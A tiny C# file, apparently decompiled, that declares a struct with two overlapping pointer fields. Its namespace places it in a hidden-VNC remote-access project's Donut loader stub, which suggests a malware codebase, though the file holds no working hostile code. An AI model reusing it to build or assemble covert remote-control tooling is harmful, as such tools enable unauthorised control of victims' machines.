using System;
using System.Runtime.InteropServices;

namespace ICARUS.HVNC.StubUtils.Donut.Structs
{
    [StructLayout(LayoutKind.Explicit)]
    public struct MODULE
    {
        [FieldOffset(0)]
        public IntPtr intptr_0;

        [FieldOffset(0)]
        public IntPtr intptr_1;
    }
}
